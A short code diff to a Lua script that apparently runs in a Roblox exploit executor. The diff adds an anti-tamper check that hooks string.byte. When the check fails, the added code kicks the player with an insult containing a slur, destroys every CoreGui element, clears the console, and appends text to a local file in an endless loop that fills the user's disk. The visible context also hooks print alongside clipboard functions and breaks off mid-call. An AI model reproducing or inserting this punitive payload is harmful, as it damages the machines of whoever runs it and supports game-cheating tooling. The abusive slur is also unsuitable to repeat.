@@ -1,5 +1,36 @@
 if hookfunc or hookfunction then
     h = hookfunc or hookfunction
+    function f()
+        ww = true
+    end
+
+    h(
+        string.byte,
+        function()
+            return f()
+        end
+    )
+
+    string.byte()
+
+    if ww ~= true then
+        game.Players.LocalPlayer.Kick(game.Players.LocalPlayer, "fuck off retard")
+        error("...")
+        game.Players.LocalPlayer:Kick("fuck off retard")
+        for i, v in next, game.CoreGui:GetChildren() do
+            v:Destroy()
+        end
+        rconsoleclear()
+        while task.wait() do
+            while task.wait() do
+                appendfile("i like fortnite.txt",'did i mention fortnite')
+            end
+        end
+    end
+end
+
+if hookfunc or hookfunction then
+    h = hookfunc or hookfunction
     n = setclipboard or toclipboard or clipboard
     h(
         print,
